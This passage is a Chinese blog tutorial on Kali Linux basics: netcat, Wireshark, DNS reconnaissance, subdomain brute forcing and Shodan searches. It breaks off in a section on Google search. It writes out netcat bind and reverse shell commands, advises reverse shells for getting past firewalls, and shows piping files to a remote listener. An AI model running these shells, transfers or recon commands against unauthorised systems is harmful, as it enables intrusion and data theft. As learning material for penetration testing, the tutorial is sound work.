<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#222"><meta name="generator" content="Hexo 4.2.0"><link rel="apple-touch-icon" sizes="180x180" href="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/avatar.png"><link rel="icon" type="image/png" sizes="32x32" href="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/avatar.png"><link rel="icon" type="image/png" sizes="16x16" href="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/avatar.png"><link rel="mask-icon" href="/images/logo.svg" color="#222"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="baidu-site-verification" content="EtrqTppKP2zrDi7r"><link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/font-awesome/css/all.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css"><script id="hexo-configurations">var NexT=window.NexT||{},CONFIG={hostname:"uestc-toy.github.io",root:"/",scheme:"Gemini",version:"7.8.0",exturl:!0,sidebar:{position:"left",display:"post",padding:18,offset:12,onmobile:!1},copycode:{enable:!0,show_result:!0,style:null},back2top:{enable:!0,sidebar:!0,scrollpercent:!0},bookmark:{enable:!0,color:"#222",save:"auto"},fancybox:!0,mediumzoom:!1,lazyload:!0,pangu:!1,comments:{style:"tabs",active:"valine",storage:!0,lazyload:!1,nav:null,activeClass:"valine"},algolia:{hits:{per_page:10},labels:{input_placeholder:"Search for Posts",hits_empty:"We didn't find any results for the search: ${query}",hits_stats:"${hits} results found in ${time} ms"}},localsearch:{enable:!0,trigger:"auto",top_n_per_article:1,unescape:!1,preload:!1},motion:{enable:!0,async:!1,transition:{post_block:"fadeIn",post_header:"slideDownIn",post_body:"slideDownIn",coll_header:"slideLeftIn",sidebar:"slideUpIn"}},path:"search.xml"}</script><meta name="description" content="常用命令netstat -pantu ：查看本机与外界的TCP&#x2F;UDP连接sudo passwd root：为root设置密码"><meta property="og:type" content="article"><meta property="og:title" content="Kali使用教程（一）：常用命令和基本工具使用"><meta property="og:url" content="http://uestc-toy.github.io/2020/06/12/Kali%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9A%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%92%8C%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/index.html"><meta property="og:site_name" content="小yi的blog"><meta property="og:description" content="常用命令netstat -pantu ：查看本机与外界的TCP&#x2F;UDP连接sudo passwd root：为root设置密码"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200608153428232.png"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200608105457977.png"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200608110108800.png"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200608163108785.png"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200608165600432.png"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200609102507339.png"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200609105201886.png"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200609105435329.png"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200609111657846.png"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200609111723401.png"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200609161551929.png"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200609161728440.png"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200609162101517.png"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200609191006019.png"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200611094925425.png"><meta property="article:published_time" content="2020-06-12T10:36:36.000Z"><meta property="article:modified_time" content="2020-08-27T01:48:50.596Z"><meta property="article:author" content="tosang"><meta property="article:tag" content="Kali"><meta property="article:tag" content="Linux"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200608153428232.png"><link rel="canonical" href="http://uestc-toy.github.io/2020/06/12/Kali%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9A%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%92%8C%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"><script id="page-configurations">CONFIG.page={sidebar:"",isHome:!1,isPost:!0,lang:"zh-CN"}</script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/theme-next/theme-next-needmoreshare2@1/needsharebutton.min.css"><style>#needsharebutton-postbottom{cursor:pointer;height:26px;margin-top:10px;position:relative}#needsharebutton-postbottom .btn{border:1px solid $btn-default-border-color;border-radius:3px;display:initial;padding:1px 4px}</style><style>#needsharebutton-float{bottom:88px;cursor:pointer;left:-8px;position:fixed;z-index:9999}#needsharebutton-float .btn{border:1px solid $btn-default-border-color;border-radius:4px;padding:0 10px 0 14px}</style><title>Kali使用教程（一）：常用命令和基本工具使用 | 小yi的blog</title><script data-pjax>var _hmt=_hmt||[];!function(){var e=document.createElement("script");e.src="https://hm.baidu.com/hm.js?063295f670f17958c713a81e3a2d6844";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)}()</script><noscript><style>.sidebar-inner,.use-motion .brand,.use-motion .collection-header,.use-motion .comments,.use-motion .menu-item,.use-motion .pagination,.use-motion .post-block,.use-motion .post-body,.use-motion .post-header{opacity:initial}.use-motion .site-subtitle,.use-motion .site-title{opacity:initial;top:initial}.use-motion .logo-line-before i{left:initial}.use-motion .logo-line-after i{right:initial}</style></noscript></head><body itemscope itemtype="http://schema.org/WebPage"><div class="container use-motion"><div class="headband"></div><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="header-inner"><div class="site-brand-container"><div class="site-nav-toggle"><div class="toggle" aria-label="切换导航栏"><span class="toggle-line toggle-line-first"></span> <span class="toggle-line toggle-line-middle"></span> <span class="toggle-line toggle-line-last"></span></div></div><div class="site-meta"><a href="/" class="brand" rel="start"><span class="logo-line-before"><i></i></span><h1 class="site-title">小yi的blog</h1><span class="logo-line-after"><i></i></span></a><p class="site-subtitle" itemprop="description">从前很忙</p></div><div class="site-nav-right"><div class="toggle popup-trigger"><i class="fa fa-search fa-fw fa-lg"></i></div></div></div><nav class="site-nav"><ul id="menu" class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">12</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">7</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">15</span></a></li><li class="menu-item menu-item-search"><a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索</a></li></ul></nav><div class="search-pop-overlay"><div class="popup search-popup"><div class="search-header"><span class="search-icon"><i class="fa fa-search"></i></span><div class="search-input-container"><input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input"></div><span class="popup-btn-close"><i class="fa fa-times-circle"></i></span></div><div id="search-result"><div id="no-result"><i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i></div></div></div></div></div></header><div class="reading-progress-bar"></div><a role="button" class="book-mark-link book-mark-link-fixed"></a><main class="main"><div class="main-inner"><div class="content-wrap"><div class="content post posts-expand"><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="http://uestc-toy.github.io/2020/06/12/Kali%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9A%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%92%8C%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/avatar.png"><meta itemprop="name" content="tosang"><meta itemprop="description" content="blog、记录和分享"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="小yi的blog"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">Kali使用教程（一）：常用命令和基本工具使用</h1><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建时间：2020-06-12 18:36:36" itemprop="dateCreated datePublished" datetime="2020-06-12T18:36:36+08:00">2020-06-12</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar-check"></i> </span><span class="post-meta-item-text">更新于</span> <time title="修改时间：2020-08-27 09:48:50" itemprop="dateModified" datetime="2020-08-27T09:48:50+08:00">2020-08-27</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-folder"></i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a> </span></span><span id="/2020/06/12/Kali%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9A%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%92%8C%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" class="post-meta-item leancloud_visitors" data-flag-title="Kali使用教程（一）：常用命令和基本工具使用" title="阅读次数"><span class="post-meta-item-icon"><i class="fa fa-eye"></i> </span><span class="post-meta-item-text">阅读次数：</span> <span class="leancloud-visitors-count"></span> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-comment"></i> </span><span class="post-meta-item-text">Valine：</span> <a title="valine" href="/2020/06/12/Kali%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9A%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%92%8C%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/#valine-comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/2020/06/12/Kali%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9A%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%92%8C%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" itemprop="commentCount"></span></a></span><br><span class="post-meta-item" title="本文字数"><span class="post-meta-item-icon"><i class="far fa-file-word"></i> </span><span class="post-meta-item-text">本文字数：</span> <span>8.1k</span> </span><span class="post-meta-item" title="阅读时长"><span class="post-meta-item-icon"><i class="far fa-clock"></i> </span><span class="post-meta-item-text">阅读时长 &asymp;</span> <span>7 分钟</span></span></div></header><div class="post-body" itemprop="articleBody"><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><ul><li><code>netstat -pantu</code> ：查看本机与外界的TCP/UDP连接</li><li><code>sudo passwd root</code>：为root设置密码</li></ul><a id="more"></a><h3 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h3><h4 id="NC-NETCAT"><a href="#NC-NETCAT" class="headerlink" title="NC-NETCAT"></a><code>NC-NETCAT</code></h4><blockquote><p>nc是一款远程传输，控制工具。使用nc -h 命令查看参数描述</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200608153428232.png" alt="image-20200608153428232"></p><h5 id="NC——获取Banner信息"><a href="#NC——获取Banner信息" class="headerlink" title="NC——获取Banner信息"></a>NC——获取Banner信息</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc -nv x.x.x.x port  nc作为客户端连接对方服务器</span><br><span class="line">说明：</span><br><span class="line">	-v 显示详细信息</span><br><span class="line">	-n 后面添加ip地址，不会进行DNS解析</span><br></pre></td></tr></table></figure><p>测试：</p><blockquote><p>首先使用ping + 域名 获取ip地址</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200608105457977.png" alt="image-20200608105457977"></p><blockquote><p>由于pop3的端口为110，直接用nc -nv命令连接</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200608110108800.png" alt="image-20200608110108800"></p><h5 id="NC——传输文本（Telnet）"><a href="#NC——传输文本（Telnet）" class="headerlink" title="NC——传输文本（Telnet）"></a>NC——传输文本（Telnet）</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">A:nc -l -p port 监听端port端口</span><br><span class="line">B:nc -nv x.x.x.x port 发送端,x.x.x.x为监听端ip</span><br><span class="line"></span><br><span class="line">用途：电子取证、信息收集</span><br><span class="line"></span><br><span class="line">示例：我们希望将远程服务端的文件目录发送到本机，并且不显示远程主机上，可以使用如下命令:</span><br><span class="line"></span><br><span class="line">远程服务器：ls -l | nc -nv x.x.x.x port -q 1 这里-q 1表示发送完成后等待1s时间就退出nc</span><br><span class="line"></span><br><span class="line">接收端：nc -l -p port &gt; log.txt 监听并将信息保存在log.txt文件中大萨达</span><br></pre></td></tr></table></figure><h5 id="NC——传输文件-目录"><a href="#NC——传输文件-目录" class="headerlink" title="NC——传输文件/目录"></a>NC——传输文件/目录</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">传输文件: </span><br><span class="line">	从B--&gt;A</span><br><span class="line">	A: nc -lp port &gt; video.mp4</span><br><span class="line">	B: nc -nv x.x.x.x port &lt; video.mp4 -q 1 </span><br><span class="line">			&lt;符号表示传入数据，&gt;符号表示保存数据</span><br><span class="line">	</span><br><span class="line">    也可以从A--&gt;B</span><br><span class="line">    A: nc -lp port &lt; video.mp4 -q 1 </span><br><span class="line">	B: nc -nv x.x.x.x port &gt; video.mp4 </span><br><span class="line"></span><br><span class="line">传输目录：</span><br><span class="line">	原理类似，只不过需要在传输过程对目录打包和解压</span><br><span class="line">	A:tar -cvf - /music | nc -l -p port -q 1</span><br><span class="line">	B:nc -nv x.x.x.x port | tar -xvf -</span><br></pre></td></tr></table></figure><h5 id="NC——端口扫描（不太准确，不常用）"><a href="#NC——端口扫描（不太准确，不常用）" class="headerlink" title="NC——端口扫描（不太准确，不常用）"></a>NC——端口扫描（不太准确，不常用）</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -nvz x.x.x.x 1-65535 探测所有tcp端口</span><br><span class="line">nc -nvzu x.x.x.x 1-1024	探测udp端口</span><br></pre></td></tr></table></figure><h5 id="NC——远程控制"><a href="#NC——远程控制" class="headerlink" title="NC——远程控制"></a>NC——远程控制</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">正向控制：</span><br><span class="line">	A:nc -lp port -c bash A提供bash</span><br><span class="line">	B:nc x.x.x.x port B使用bash</span><br><span class="line">	</span><br><span class="line">反向控制： </span><br><span class="line">	A:nc -lp port A使用bash</span><br><span class="line">	B:nc x.x.x.x port -c bash B提供bash</span><br><span class="line">	</span><br><span class="line">思考：在渗透测试中，正向控制一般是会被防火墙拦截的，所以可以尝试反向控制，让服务端连接自己暴露的端口</span><br><span class="line"></span><br><span class="line">注意：Windwos平台将bash改成cmd</span><br></pre></td></tr></table></figure><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><blockquote><p>NC缺乏加密和身份验证的能力，不安全。可以使用NCAT来弥补NC的不足， 因为它是支持SSL加密，NCAT包含于nmap中</p></blockquote><h4 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a><code>Wireshark</code></h4><blockquote><p>Wireshark是一款抓包嗅探、协议分析的工具。</p></blockquote><h5 id="使用wireshark抓包"><a href="#使用wireshark抓包" class="headerlink" title="使用wireshark抓包"></a>使用wireshark抓包</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">这里以抓取本机网卡数据包为例。首先打开终端，尝试ping百度</span><br><span class="line"></span><br><span class="line">ping www.baidu.com</span><br><span class="line"></span><br><span class="line">同时打开wireshark，选则虚拟机网卡eth0，再启动抓包</span><br></pre></td></tr></table></figure><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200608163108785.png" alt="image-20200608163108785"></p><blockquote><p>这里可以保存抓包数据文件，建议保存为pcap格式，兼容性较好。</p></blockquote><h5 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h5><blockquote><p>wireshark可以针对ip、域名、协议进行过滤，支持组合表达式，称为过滤器。如下图中，可以选则当前协议行作为过滤器应用。</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200608165600432.png" alt="image-20200608165600432"></p><h5 id="常见协议包"><a href="#常见协议包" class="headerlink" title="常见协议包"></a>常见协议包</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wireshark默认通过端口来识别协议类型，如80端口识别为http，如有必要需要手动指定协议类型</span><br><span class="line"></span><br><span class="line">数据包协议如下：ARP、ICMP、TCP、UDP、DNS、http、ftp</span><br><span class="line"></span><br><span class="line">TCP数据流：HTTP、SMTP、POP3、SSL/TLS（加密传输，无法查看内容）</span><br></pre></td></tr></table></figure><h5 id="统计分析"><a href="#统计分析" class="headerlink" title="统计分析"></a>统计分析</h5><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">follow</span> tcp <span class="keyword">stream：查看传输内容</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">Endpoints:查看每种协议具体的ip、包大小、发送数量。</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">协议分级：查看当前帧下的所有协议流量所占百分比。</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">分组长度：查看不同大小包所占百分比。小包过多会导致瘫痪，可能是攻击行为。</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">Conversitions：查看所有会话之间的通信情况。</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">专家系统：针对连接提供一些建议或提示</span></span><br></pre></td></tr></table></figure><h5 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h5><blockquote><p>wireshark 不适用于抓取大量报，因此企业使用一般会使用类似于</p><p>Sniffer、Cace、Cascad poit等。</p></blockquote><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="DNS信息收集——NSLOOKUP"><a href="#DNS信息收集——NSLOOKUP" class="headerlink" title="DNS信息收集——NSLOOKUP"></a>DNS信息收集——NSLOOKUP</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">使用nslookup查看域名解析过程和对应ip</span><br><span class="line"></span><br><span class="line">tosang@kali:~/桌面$ nslookup</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> www.baidu.com</span></span><br><span class="line">Server:         114.114.114.114</span><br><span class="line">Address:        114.114.114.114#53</span><br><span class="line"></span><br><span class="line">Non-authoritative answer:</span><br><span class="line">www.baidu.com   canonical name = www.a.shifen.com.</span><br><span class="line">Name:   www.a.shifen.com</span><br><span class="line">Address: 61.135.169.125</span><br><span class="line">Name:   www.a.shifen.com</span><br><span class="line">Address: 61.135.169.121</span><br></pre></td></tr></table></figure><h4 id="DNS信息收集——DIG（更强大）"><a href="#DNS信息收集——DIG（更强大）" class="headerlink" title="DNS信息收集——DIG（更强大）"></a>DNS信息收集——DIG（更强大）</h4><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200609102507339.png" alt="image-20200609102507339"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">根据自定义域名服务器查询：dig @8.8.8.8 www.sina.com mx</span><br><span class="line"></span><br><span class="line">正向查询：dig www.sina.com any </span><br><span class="line"></span><br><span class="line">反向查询（使用ptr反向解析）: dig +noall +answer -x 8.8.8.8</span><br><span class="line">		其中+noall +answer表示省略无用信息</span><br><span class="line"></span><br><span class="line">bind版本信息: dig +noall +answer txt chaos VERSION.BIND @ns3.dnsv4.com </span><br><span class="line">			通过查询bind版本信息可以分析是否存在漏掉可以利用</span><br><span class="line"></span><br><span class="line">DNS追踪: dig +trace example.com</span><br><span class="line"></span><br><span class="line">抓包比较递归查询、迭代查询过程的区别</span><br></pre></td></tr></table></figure><hr><blockquote><p>DNS追踪示例：图中是13个根域名服务器（root域）</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200609105201886.png" alt="image-20200609105201886"></p><blockquote><p>接着查询.com域名服务器地址（com域）</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200609105435329.png" alt="image-20200609105435329"></p><blockquote><p>然后从这些.com域名中随机挑选一个ip去查询baidu.com域的ns记录</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200609111657846.png" alt="image-20200609111657846"></p><blockquote><p>最后从ns记录中随机挑选一个去查询<span class="exturl" data-url="aHR0cDovL3d3dy5iYWlkdS5jb23orrDlvZXlvpfliLBjbmFtZee7k+aenO+8jOino+aekGNuYW1l5Y+v5Lul5LuO55m+5bqm55qE5Z+f5ZCN5pyN5Yqh5Zmo77yIbnPvvInlvpfliLDmnIDnu4hpcOWcsOWdgA==">www.baidu.com记录得到cname结果，解析cname可以从百度的域名服务器（ns）得到最终ip地址<i class="fa fa-external-link-alt"></i></span></p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200609111723401.png" alt="image-20200609111723401"></p><h4 id="DNS区域传输（Zone-Transfer）"><a href="#DNS区域传输（Zone-Transfer）" class="headerlink" title="DNS区域传输（Zone Transfer）"></a>DNS区域传输（Zone Transfer）</h4><blockquote><p>区域传输是指域名服务器之间同步数据的过程，通过区域传输可以获得某一个域里面的所有主机记录</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">以下命令可以尝试去连接域名服务器，但一般会被拒绝</span><br><span class="line">dig @ns1.example.com example.com axfr</span><br><span class="line">host -T -l sina.com8.8.8.8</span><br></pre></td></tr></table></figure><h4 id="DNS爆破"><a href="#DNS爆破" class="headerlink" title="DNS爆破"></a>DNS爆破</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">fierce -dnsserver 8.8.8.8 -dns sina.com.cn -wordlist a.txt </span><br><span class="line">	fierce自带字典host.txt，可以通过命令 查看</span><br><span class="line"></span><br><span class="line">dnsdict6 -d4 -t 16 -x sina.com </span><br><span class="line">	默认集成多种字典，命中率高，执行速度快，最常用</span><br><span class="line"></span><br><span class="line">dnsenum -f dnsbig.txt -dnsserver 8.8.8.8 sina.com -0 sina.xml</span><br><span class="line"></span><br><span class="line">dnsmap sina.com -W dns.txt</span><br><span class="line"></span><br><span class="line">dnsrecon -d sina.com -lifetime 10 -t brt -D dnsbig.txt</span><br><span class="line"></span><br><span class="line">dnsrecon -t std -d sina.com</span><br></pre></td></tr></table></figure><h4 id="DNS注册信息"><a href="#DNS注册信息" class="headerlink" title="DNS注册信息"></a>DNS注册信息</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">说明：一般大型互联网企业域名都做了反查询，所以会查不到</span><br><span class="line"></span><br><span class="line">Whois </span><br><span class="line"></span><br><span class="line">whois -h whois.apnic.net 192.0.43.10</span><br></pre></td></tr></table></figure><h4 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">SHODAN：使用前需要到shodan官网注册一个账号，并获取自己的API Key</span><br><span class="line"></span><br><span class="line">搜索联网的设备</span><br><span class="line">Banner: http、 ftp、 ssh、 telnet</span><br><span class="line">https://www.shodanio/</span><br><span class="line">常见filter:</span><br><span class="line">	net (192. 168.20.1)</span><br><span class="line">	city</span><br><span class="line">	country (CN、US)</span><br><span class="line">	port (80、 21、22、23)</span><br><span class="line">	OS</span><br><span class="line">	Hostname (主机或域名)</span><br><span class="line">	server</span><br><span class="line">	</span><br><span class="line">示例：搜索中国地区端的81端口ip</span><br><span class="line">port:81 country:CN HTTP/1.1 200</span><br></pre></td></tr></table></figure><blockquote><p>使用示例：首先通过nc获取某个域名的ip，这里以gscaep.ac.cn为例</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200609161551929.png" alt="image-20200609161551929"></p><blockquote><p>使用shodan来搜索该ip的所有信息</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200609161728440.png" alt="image-20200609161728440"></p><blockquote><p>这一刀这里暴露了使用的数据库版本及其端口信息，可以尝试用nc去连接</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200609162101517.png" alt="image-20200609162101517"></p><h4 id="GOOGLE搜索方法"><a href="#GOOGLE搜索方法" class="headerlink" title="GOOGLE搜索方法"></a>GOOGLE搜索方法</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 